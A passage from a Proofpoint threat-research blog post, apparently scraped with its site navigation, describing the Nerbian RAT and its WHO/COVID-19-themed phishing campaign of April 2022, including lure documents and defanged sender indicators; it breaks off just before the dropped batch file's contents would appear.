                                          <a href="/us/products/packages-data-security" class="header-nav__content-link-text">How to Buy</a>
                                                          </div>
                                                                                                                <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Data &amp; SaaS Security Posture</div>
                                          <div class="header-nav__content-group-desc">Remediate data and SaaS exposures by understanding your risk posture.</div>
                                      </div>
                                                                              <div class="header-nav__content-link">
                                          <a href="/us/products/identity-protection/account-takeover" class="header-nav__content-link-text">Account Takeover Protection</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/data-security-posture-management" class="header-nav__content-link-text">Data Security Posture Management (DSPM)</a>
                                                          </div>
                                                                                                                <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Human Resilience</div>
                                          <div class="header-nav__content-group-desc">Unlock full user risk visibility and drive behavior change.</div>
                                      </div>
                                                                              <div class="header-nav__content-link">
                                          <a href="/us/products/mitigate-human-risk" class="header-nav__content-link-text">ZenGuide</a>
                                                          </div>
                                                                                                 <a href="/us/products/premium-services" class="header-nav__content-link-group-anchor header-nav__content-link-group-anchor--divider">                   <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Premium Services</div>
                                          <div class="header-nav__content-group-desc">Leverage our strategic guidance and hands-on expertise to optimize your Proofpoint solutions.</div>
                                      </div>
                   </a>                                                                                                    <a href="/us/products" class="header-nav__content-link-group-anchor header-nav__content-link-group-anchor--divider">                   <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">All Products</div>
                                          <div class="header-nav__content-group-desc">Browse the full Proofpoint product suite.</div>
                                      </div>
                   </a>                                                             <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:products_more_tp_products_panel">More products</a>
                                                          </div>
                                                          <div class="header-nav__content-link-spacer"></div>
                                                        </div>
      </div>
          <div class="header-nav__menu-pane" data-content="products_more_tp_products_panel">
        <div class="header-nav__content">
                                   <div class="header-nav__content-heading">More Proofpoint Products</div>                                                                                       <div class="header-nav__content-link">
                                          <a href="/us/products/identity-protection/account-takeover" class="header-nav__content-link-text">Account Takeover Protection (ATO)</a>
                                                              <div class="header-nav__content-link-desc">Detect, investigate and remediate account takeovers with sophisticated machine learning.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/adaptive-email-dlp" class="header-nav__content-link-text">Adaptive Email DLP</a>
                                                              <div class="header-nav__content-link-desc">Detect and prevent accidental and malicious email data loss with advanced ML and behavioral AI.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance/archive" class="header-nav__content-link-text">Archive</a>
                                                              <div class="header-nav__content-link-desc">Securely store enterprise communications and search with deep data insights.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance/automate" class="header-nav__content-link-text">Automate</a>
                                                              <div class="header-nav__content-link-desc">Streamline compliance supervision by reducing low-risk content and analyst review fatigue using machine learning models.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance/capture" class="header-nav__content-link-text">Capture</a>
                                                              <div class="header-nav__content-link-desc">Collect and retain all digital communications for compliance, legal discovery, and long-term information retention.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/cloud-security/cloud-app-security-broker" class="header-nav__content-link-text">CASB</a>
                                                              <div class="header-nav__content-link-desc">Protect cloud apps and data with visibility, control, and threat prevention.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/collab-protection" class="header-nav__content-link-text">Collab Protection</a>
                                                              <div class="header-nav__content-link-desc">Extend protection beyond email for all messaging and collaboration tools.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/email-protection" class="header-nav__content-link-text">Core Email Protection</a>
                                                              <div class="header-nav__content-link-desc">Protect your people from email threats using AI and global threat intelligence.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance/discover" class="header-nav__content-link-text">Discover</a>
                                                              <div class="header-nav__content-link-desc">Process, analyze and cull more archived information in-house for e-discovery.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/data-security-posture-management" class="header-nav__content-link-text">Data Security Posture Management (DSPM)</a>
                                                              <div class="header-nav__content-link-desc">Discover, classify, and protect sensitive data across cloud and hybrid environments.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/email-dlp-encryption" class="header-nav__content-link-text">Email DLP &amp; Encryption</a>
                                                              <div class="header-nav__content-link-desc">Prevent email data loss and encrypt sensitive emails with granular and dynamic rules-based controls.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/information-protection/endpoint-dlp" class="header-nav__content-link-text">Endpoint DLP</a>
                                                              <div class="header-nav__content-link-desc">Detect and prevent data loss at the endpoint.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/information-protection/enterprise-dlp" class="header-nav__content-link-text">Enterprise DLP</a>
                                                              <div class="header-nav__content-link-desc">Detect and resolve data loss risk across email, cloud, and endpoints with centralized policies.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/email-protection/email-fraud-defense" class="header-nav__content-link-text">Email Fraud Defense</a>
                                                              <div class="header-nav__content-link-desc">Protect your brand reputation, meet DMARC requirements to increase deliverability and identify lookalikes of your domains.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/information-protection/insider-threat-management" class="header-nav__content-link-text">Insider Threat Management</a>
                                                              <div class="header-nav__content-link-desc">Detect and prevent insider threats with deep visibility into risky behavior.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance/patrol" class="header-nav__content-link-text">Patrol</a>
                                                              <div class="header-nav__content-link-desc">Monitor and manage social media compliance with automated workflows and reporting.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/threat-protection" class="header-nav__content-link-text">Prime Threat Protection</a>
                                                              <div class="header-nav__content-link-desc">Stop all human-centric attacks across multiple channels and stages with AI threat detection.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/email-security-and-protection/secure-email-relay" class="header-nav__content-link-text">Secure Email Relay</a>
                                                              <div class="header-nav__content-link-desc">Increase control and security for application-generated email and accelerate DMARC implementation.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance/supervision" class="header-nav__content-link-text">Supervision</a>
                                                              <div class="header-nav__content-link-desc">Monitor and supervise digital communications to enable compliance with SEC, FINRA, and other regulations.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/digital-communications-governance/track" class="header-nav__content-link-text">Track</a>
                                                              <div class="header-nav__content-link-desc">Track, audit, report on and reconcile all content in your capture stream for compliance.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/products/mitigate-human-risk" class="header-nav__content-link-text">ZenGuide</a>
                                                              <div class="header-nav__content-link-desc">Strengthen human resilience through automated, risk-based learning.</div>
                                      </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="solutions_panel">
        <div class="header-nav__content">
                                                                                                                                                                              <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Solutions by Use Case</div>
                                          <div class="header-nav__content-group-desc">How Proofpoint protects your people and data.</div>
                                      </div>
                                                                              <div class="header-nav__content-link">
                                          <a href="/us/solutions/ensure-acceptable-genai-use" class="header-nav__content-link-text">Ensure Acceptable GenAI Use</a>
                                                              <div class="header-nav__content-link-desc">Empower your workforce with safe GenAI practices.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/email-authentication-with-dmarc" class="header-nav__content-link-text">Authenticate Your Email</a>
                                                              <div class="header-nav__content-link-desc">Protect your email deliverability with DMARC.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/combat-email-and-cloud-threats" class="header-nav__content-link-text">Combat Email and Cloud Threats</a>
                                                              <div class="header-nav__content-link-desc">Protect your people from email and cloud threats with an intelligent and holistic approach.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:solutions_by_use_case_panel">More use cases</a>
                                                          </div>
                                                                                                                <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Solutions by Industry</div>
                                          <div class="header-nav__content-group-desc">People-centric solutions for your organization.</div>
                                      </div>
                                                                              <div class="header-nav__content-link">
                                          <a href="/us/solutions/federal" class="header-nav__content-link-text">Federal Government</a>
                                                              <div class="header-nav__content-link-desc">Cybersecurity for federal government agencies.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/state-and-local-government" class="header-nav__content-link-text">State and Local Government</a>
                                                              <div class="header-nav__content-link-desc">Protecting the public sector, and the public from cyber threats.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:solutions_by_industry_panel">More industries</a>
                                                          </div>
                                                                                               <a href="/us/compare" class="header-nav__content-link-group-anchor">                   <div class="header-nav__content-link-group">
                    <div class="header-nav__content-group-title">Comparing Proofpoint</div>
                                          <div class="header-nav__content-group-desc">Evaluating cybersecurity vendors? Check out our side-by-side comparisons.</div>
                                      </div>
                   </a>                                                             <div class="header-nav__content-link">
                                          <a href="#" class="header-nav__content-link-text" data-open="content:compare_proofpoint_panel">View comparisons</a>
                                                          </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="solutions_by_use_case_panel">
        <div class="header-nav__content">
                       <h3 class="header-nav__content-title">Solutions By Use Case</h3>              <div class="header-nav__content-heading">How Proofpoint protects your people and data.</div>                                                                                       <div class="header-nav__content-link">
                                          <a href="/us/solutions/change-user-behavior" class="header-nav__content-link-text">Change User Behavior</a>
                                                              <div class="header-nav__content-link-desc">Help your employees identify, resist and report attacks before the damage is done.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/combat-data-loss-and-insider-risk" class="header-nav__content-link-text">Combat Data Loss and Insider Risk</a>
                                                              <div class="header-nav__content-link-desc">Prevent data loss via negligent, compromised and malicious insiders.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/enable-intelligent-compliance" class="header-nav__content-link-text">Modernize Compliance and Archiving</a>
                                                              <div class="header-nav__content-link-desc">Manage risk and data retention needs with a modern compliance and archiving solution.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/protect-cloud-apps" class="header-nav__content-link-text">Protect Cloud Apps</a>
                                                              <div class="header-nav__content-link-desc">Keep your people and their cloud apps secure by eliminating threats and data loss.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/prevent-loss-from-ransomware" class="header-nav__content-link-text">Prevent Loss from Ransomware</a>
                                                              <div class="header-nav__content-link-desc">Learn about this growing threat and stop attacks by securing ransomware&#039;s top vector: email.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/secure-microsoft-365" class="header-nav__content-link-text">Secure Microsoft 365</a>
                                                              <div class="header-nav__content-link-desc">Implement the best security and compliance solution for Microsoft 365.</div>
                                      </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="solutions_by_industry_panel">
        <div class="header-nav__content">
                       <h3 class="header-nav__content-title">Solutions By Industry</h3>              <div class="header-nav__content-heading">People-centric solutions for your organization.</div>                                                                                       <div class="header-nav__content-link">
                                          <a href="/us/solutions/higher-education-security" class="header-nav__content-link-text">Higher Education</a>
                                                              <div class="header-nav__content-link-desc">A higher level of security for higher education.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/financial-services-and-insurance" class="header-nav__content-link-text">Financial Services</a>
                                                              <div class="header-nav__content-link-desc">Eliminate threats, build trust and foster growth for your organization.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/healthcare-information-security" class="header-nav__content-link-text">Healthcare</a>
                                                              <div class="header-nav__content-link-desc">Protect clinicians, patient data, and your intellectual property against advanced threats.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/mobile-message-security-solutions-for-service-providers" class="header-nav__content-link-text">Mobile Operators</a>
                                                              <div class="header-nav__content-link-desc">Make your messaging environment a secure environment.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/email-security-solutions-for-service-providers" class="header-nav__content-link-text">Internet Service Providers</a>
                                                              <div class="header-nav__content-link-desc">Cloudmark email protection.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/solutions/protection-compliance-small-business" class="header-nav__content-link-text">Small and Medium Businesses</a>
                                                              <div class="header-nav__content-link-desc">Big-time security for small business.</div>
                                      </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="compare_proofpoint_panel">
        <div class="header-nav__content">
                       <h3 class="header-nav__content-title">Proofpoint vs. the competition</h3>              <div class="header-nav__content-heading">Side-by-side comparisons.</div>                                                                                       <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-abnormal-security" class="header-nav__content-link-text">Proofpoint vs. Abnormal Security</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-mimecast" class="header-nav__content-link-text">Proofpoint vs. Mimecast</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-cisco" class="header-nav__content-link-text">Proofpoint vs. Cisco</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-microsoft-purview" class="header-nav__content-link-text">Proofpoint vs. Microsoft Purview</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-legacy-dlp" class="header-nav__content-link-text">Proofpoint vs. Legacy DLP</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/compare/proofpoint-vs-check-point-harmony" class="header-nav__content-link-text">Proofpoint vs. Check Point Harmony</a>
                                                          </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="partners_panel">
        <div class="header-nav__content">
                       <h3 class="header-nav__content-title">Partners</h3>              <div class="header-nav__content-heading">Deliver Proofpoint solutions to your customers.</div>                           

  


<a href="https://partners.proofpoint.com" class="global-elements__cta global-elements__cta-btn global-elements__cta global-elements__cta-btn--black global-elements__cta global-elements__cta-btn header-nav__content-button" >
      Channel Partners
    </a>

                                                                                      <div class="header-nav__content-link">
                                          <a href="/us/channel-partners-and-distributors" class="header-nav__content-link-text">Channel Partners and Distributors</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/partners/msp" class="header-nav__content-link-text">MSP Partners</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/partners/trusted-data-solutions-partnership" class="header-nav__content-link-text">Archive Extraction Partners</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/global-system-integrator-gsi-and-global-managed-service-provider-msp-partners" class="header-nav__content-link-text">GSI Partners</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/partners/technology-alliance-partners" class="header-nav__content-link-text">Technology and Alliance Partners</a>
                                                          </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/partners/digital-risk-and-compliance-partners" class="header-nav__content-link-text">Social Media Protection Partners</a>
                                                          </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="resources_panel">
        <div class="header-nav__content">
                       <h3 class="header-nav__content-title">Resources</h3>              <div class="header-nav__content-heading">Find reports, webinars, blogs, events, podcasts and more.</div>                           

  


<a href="/us/resources" class="global-elements__cta global-elements__cta-btn global-elements__cta global-elements__cta-btn--black global-elements__cta global-elements__cta-btn header-nav__content-button" >
      Resource Library
    </a>

                                                                                      <div class="header-nav__content-link">
                                          <a href="/us/blog" class="header-nav__content-link-text">Blog</a>
                                                              <div class="header-nav__content-link-desc">Keep up with the latest news and happenings.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/webinars" class="header-nav__content-link-text">Webinars</a>
                                                              <div class="header-nav__content-link-desc">Browse our webinar library to learn about the latest threats, trends and issues in cybersecurity.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/cybersecurityacademy" class="header-nav__content-link-text">Cybersecurity Academy</a>
                                                              <div class="header-nav__content-link-desc">Earn your certification to become a Proofpoint Certified Guardian.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/podcasts" class="header-nav__content-link-text">Podcasts</a>
                                                              <div class="header-nav__content-link-desc">Learn about the human side of cybersecurity.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/threat-reference" class="header-nav__content-link-text">Threat Glossary</a>
                                                              <div class="header-nav__content-link-desc">Learn about the latest security threats.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/events" class="header-nav__content-link-text">Events</a>
                                                              <div class="header-nav__content-link-desc">Connect with us at events to learn how to protect your people and data from ever-evolving threats.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/customer-stories" class="header-nav__content-link-text">Customer Stories</a>
                                                              <div class="header-nav__content-link-desc">Read how our customers solve their most pressing cybersecurity challenges.</div>
                                      </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="company_panel">
        <div class="header-nav__content">
                       <h3 class="header-nav__content-title">Company</h3>              <div class="header-nav__content-heading">Proofpoint protects organizations' greatest assets and biggest risks: their people.</div>                           

  


<a href="/us/company/about" class="global-elements__cta global-elements__cta-btn global-elements__cta global-elements__cta-btn--black global-elements__cta global-elements__cta-btn header-nav__content-button" >
      About Proofpoint
    </a>

                                                                                      <div class="header-nav__content-link">
                                          <a href="/us/company/careers" class="header-nav__content-link-text">Careers</a>
                                                              <div class="header-nav__content-link-desc">Stand out and make a difference at one of the world&#039;s leading cybersecurity companies.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/newsroom" class="header-nav__content-link-text">News Center</a>
                                                              <div class="header-nav__content-link-desc">Read the latest press releases, news stories and media highlights about Proofpoint.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/legal/trust" class="header-nav__content-link-text">Privacy and Trust</a>
                                                              <div class="header-nav__content-link-desc">Learn about how we handle data and make commitments to privacy and other regulations.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/legal/esg" class="header-nav__content-link-text">Environmental, Social, and Governance</a>
                                                              <div class="header-nav__content-link-desc">Learn how we apply our principles to positively impact our community.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/support-services" class="header-nav__content-link-text">Support</a>
                                                              <div class="header-nav__content-link-desc">Access the full range of Proofpoint support services.</div>
                                      </div>
                                                      </div>
      </div>
          <div class="header-nav__menu-pane" data-content="platform_panel">
        <div class="header-nav__content">
                       <h3 class="header-nav__content-title">Platform</h3>              <div class="header-nav__content-heading">Discover the Proofpoint human-centric platform.</div>                           

  


<a href="/us/platform" class="global-elements__cta global-elements__cta-btn global-elements__cta global-elements__cta-btn--black global-elements__cta global-elements__cta-btn header-nav__content-button" >
      Learn More
    </a>

                                                                                      <div class="header-nav__content-link">
                                          <a href="/us/platform/nexus" class="header-nav__content-link-text">Nexus</a>
                                                              <div class="header-nav__content-link-desc">Detection technologies to protect people and defend data.</div>
                                      </div>
                                                          <div class="header-nav__content-link">
                                          <a href="/us/platform/zen" class="header-nav__content-link-text">Zen</a>
                                                              <div class="header-nav__content-link-desc">Protect and engage users wherever they work.</div>
                                      </div>
                                                      </div>
      </div>
        <div class="header-nav__menu-pane" data-content="x_sch">
      <div class="header-nav__content">
        <div class="header-nav__content-title--search">
          Search Proofpoint
        </div>
        <div class="header-nav__search">

          <form class="header-nav__search-form">
            <input type="text" class="header-nav__search-input" placeholder="">
            <input type="submit" class="header-nav__search-button" val="Search">
          </form>
          <div class="header-nav__search-sugg-title">Try searching for</div>
          <div class="header-nav__search-suggestions">
                          <a href="/us/search?content%5Bquery%5D=Email%20Security" class="header-nav__search-suggestion">Email Security</a>
                          <a href="/us/search?content%5Bquery%5D=Phishing" class="header-nav__search-suggestion">Phishing</a>
                          <a href="/us/search?content%5Bquery%5D=DLP" class="header-nav__search-suggestion">DLP</a>
                          <a href="/us/search?content%5Bquery%5D=Email%20Fraud" class="header-nav__search-suggestion">Email Fraud</a>
                      </div>
        </div>
      </div>
    </div>
    <div class="header-nav__menu-pane" data-content="x_lgn">
      <div class="header-nav__content">
        <div class="header-nav__content-title">
          Select Product Login
        </div>
        <ul class="header-nav__logins">
                      <li class="header-nav__content-login">
              <a href="https://proofpoint.my.site.com/community/s/" target="_blank">Support Log-in</a>
            </li>
                      <li class="header-nav__content-login">
              <a href="https://proofpointcybersecurityacademy.adobelearningmanager.com" target="_blank">Proofpoint Cybersecurity Academy</a>
            </li>
                      <li class="header-nav__content-login">
              <a href="https://digitalrisk.proofpoint.com/" target="_blank">Digital Risk Portal</a>
            </li>
                      <li class="header-nav__content-login">
              <a href="https://emaildefense.proofpoint.com/login.php" target="_blank">Email Fraud Defense</a>
            </li>
                      <li class="header-nav__content-login">
              <a href="https://threatintel.proofpoint.com/" target="_blank">ET Intelligence</a>
            </li>
                      <li class="header-nav__content-login">
              <a href="https://us1.proofpointessentials.com/app/login.php" target="_blank">Proofpoint Essentials</a>
            </li>
                      <li class="header-nav__content-login">
              <a href="https://proofpointcommunities.force.com/community" target="_blank">Sendmail Support Log-in</a>
            </li>
                  </ul>
      </div>
    </div>
    <div class="header-nav__menu-pane" data-content="x_lng">
      <div class="header-nav__content">
        <div class="header-nav__content-title">
          Select Language
        </div>

        <ul class="header-nav__language-links">
                    <li class="header-nav__language-link">
            <a href="/us">English: Americas</a>
          </li>
                                                                    <li class="header-nav__language-link">
                <a href="/uk">English: Europe, Middle East, Africa</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/au">English: Asia-Pacific</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/es">Español</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/de">Deutsch</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/fr">Français</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/it">Italiano</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/br">Português</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/jp">日本語</a>
              </li>
                                                <li class="header-nav__language-link">
                <a href="/kr">한국어</a>
              </li>
                              </ul>
      </div>
    </div>
  </div>
</div>



<div class="layout-container">
  
    <div>
    <div data-drupal-messages-fallback class="hidden"></div>

  </div>


  <main class="container" role="main">
    <a id="main-content" tabindex="-1"></a>    <section class="row">
      <div class="layout-content">
          <div>
    <div id="block-particle-content">
  
    
      




<article about="/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques" class="node--type--blog-post node--view-mode--full node node-blog-full _legacy_content _blog-full">
  



  <div class="breadcrumbs _legacy_element _breadcrumbs"><div class="nav-crumbs"><div class="breadcrumb__item"><a href="/us/blog" class="breadcrum__item-link">Blog</a></div><div class="breadcrumb__item"><a href="/us/blog/threat-insight" class="breadcrum__item-link">Threat Insight</a></div><div class="breadcrumb__item">
            Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques          </div></div></div>

  <div class="blog-banner">
    <div class="blog-banner__image">      <picture>
                  <source srcset="/sites/default/files/styles/image_1920_750/public/misc/Blog_Covid19.jpg.webp?itok=3Q33BK1g 1x" media="screen and (min-width: 1440px)" type="image/webp" width="1920" height="750"/>
              <source srcset="/sites/default/files/styles/image_1024_400/public/misc/Blog_Covid19.jpg.webp?itok=HAbvlHCm 1x" media="screen and (min-width: 1024px)" type="image/webp" width="1024" height="400"/>
              <source srcset="/sites/default/files/styles/image_768_375/public/misc/Blog_Covid19.jpg.webp?itok=Ah-jFwxr 1x" media="screen and (min-width: 768px)" type="image/webp" width="768" height="375"/>
              <source srcset="/sites/default/files/styles/image_1920_750/public/misc/Blog_Covid19.jpg.webp?itok=3Q33BK1g 1x" media="screen and (min-width: 1440px)" type="image/webp" width="1920" height="750"/>
              <source srcset="/sites/default/files/styles/image_1024_400/public/misc/Blog_Covid19.jpg.webp?itok=HAbvlHCm 1x" media="screen and (min-width: 1024px)" type="image/webp" width="1024" height="400"/>
              <source srcset="/sites/default/files/styles/image_768_375/public/misc/Blog_Covid19.jpg.webp?itok=Ah-jFwxr 1x" media="screen and (min-width: 768px)" type="image/webp" width="768" height="375"/>
                  <img loading="eager" src="/sites/default/files/styles/image_768_300/public/misc/Blog_Covid19.jpg.webp?itok=p3rSeafr" width="768" height="300" alt="covid19" typeof="foaf:Image" />

  </picture>


</div>
    <div class="blog-banner__gradient-overlay"></div>
    <div class="blog-banner__heading-wrap">
      
      


<h1 class="blog-banner__heading">
      <span>Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques</span>

  </h1>

    </div>
  </div>

  <div class="blog-content">
    <div class="blog-content__sharethis sharethis_toolbox sharethis_32x32_style">
      <div class="blog-content__sharethis_label sharethis__label">Share with your network!</div>
      <div class="blog-content__sharethis_buttons sharethis_buttons">
        <div class="sharethis-inline-share-buttons"></div>
        
<span class="addthis_button_subscribe at300b UNCONVERTED" title=Subscribe>
  <span class="at-icon-wrapper block-subscribe-button__trigger block-subscribe-button__addthis"></span>
</span>


      </div>
    </div>
        <div class="blog-content__metadata blog-content__metadata-author">
      <span class="blog-content__date">  <time datetime="2022-05-11T14:39:49Z">May 11, 2022</time>

</span>
        <span class="blog-content__author">
                Andrew Northern, Pim Trouerbach, Tony Robinson, Axel F
  
        </span>
    </div>
    <div class="node-full__body blog-content__body">  <p><meta charset="utf-8"></p>

<h3><strong>Key Findings</strong></h3>

<ul>
	<li>Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities.</li>
	<li>The malware, written in the Go programming language, uses multiple open-source Go libraries for conducting malicious activities.</li>
	<li>The malware, called Nerbian remote access trojan (RAT) leverages COVID-19 and World Health Organization themes to spread.</li>
	<li>Proofpoint researchers named the malware based on a named function in the malware code. Nerbia is a fictional place from the novel&nbsp;<em>Don Quixote</em>.&nbsp;</li>
</ul>

<h3><strong>Overview</strong></h3>

<p>The newly identified Nerbian RAT leverages multiple anti-analysis components spread across several stages, including multiple open-source libraries. It is written in operating system (OS) agnostic Go programming language, compiled for 64-bit systems, and leverages several encryption routines to further evade network analysis. Go is an increasingly popular language used by threat actors, likely due to its lower barrier to entry and ease of use.&nbsp;</p>

<h3><strong>Campaign Details</strong></h3>

<p>Starting on April 26, 2022, Proofpoint researchers observed a low volume (less than 100 messages) email-borne malware campaign sent to multiple industries. The threat disproportionately impacts entities in Italy, Spain, and the United Kingdom. The emails claimed to be representing the World Health Organization (WHO) with important information regarding COVID-19. The malware sample was also noted by security researcher&nbsp;<a href="https://twitter.com/pr0xylife/status/1519704793593307136" target="_blank">pr0xylife</a>&nbsp;on Twitter. Proofpoint researchers observed the following indicators and attachments:</p>

<p><strong>From:</strong>&nbsp;who.inter.svc@gmail[.]com, announce@who-international[.]com</p>

<p><strong>Subjects:</strong>&nbsp;WHO, World Health Organization</p>

<p><strong>Attachment Names and Types:&nbsp;</strong>who_covid19.rar with who_covid19.doc inside, covid19guide.rar with covid19guide.doc inside, covid-19.doc</p>

<p>The messages that purport to be from WHO and include safety measures relating to COVID-19 include an attached Word document containing macros.</p>

<p><img alt="WHO" data-entity-type="file" data-entity-uuid="7ee3a16f-9c21-49ed-9be0-0324c9f236bf" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.57.37%20AM.png" width="852" height="534" loading="lazy"></p>

<p><em>Figure 1: Example email that purports to be from WHO.</em></p>

<p><img alt="Word doc" data-entity-type="file" data-entity-uuid="310b888d-7cdf-4f49-8097-6b5df2574103" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.57.54%20AM.png" width="835" height="447" loading="lazy"></p>

<p><em>Figure 2: Attached Word document.</em></p>

<p>The emails contain a macro-laden Word attachment (sometimes compressed with RAR). When macros are enabled, the document reveals information relating to COVID-19 safety, specifically about self-isolation and caring for individuals with COVID-19. Interestingly, the lure is similar to themes used in the early days of the pandemic in 2020, specifically spoofing the WHO to distribute information about the virus.&nbsp;</p>

<p><img alt="COVID-19" data-entity-type="file" data-entity-uuid="6692f108-a376-474a-99e0-26f0286a5b94" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.09%20AM.png" width="818" height="619" loading="lazy"></p>

<p><em>Figure 3: Screenshot of the document lure containing COVID-19 guidance, specifically what users see when they enable macros on the malicious document.</em></p>

<p>In addition to masquerading as the WHO, the document also appears to contain logos from the Health Service Executive (HSE), Government of Ireland, and National Council for the Blind of Ireland (NCBI).</p>

<p><img alt="logos" data-entity-type="file" data-entity-uuid="c50bc146-6f8d-47fb-9ccf-30ca9cd9e520" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.20%20AM.png" width="818" height="616" loading="lazy"></p>

<p><em>Figure 4: Document with additional logos related to government and non-profit entities.</em></p>

<h3><strong>Attack Path</strong></h3>

<p>When users enable macros on this document, the document executes an embedded macro that drops a .bat file with the following contents:</p>

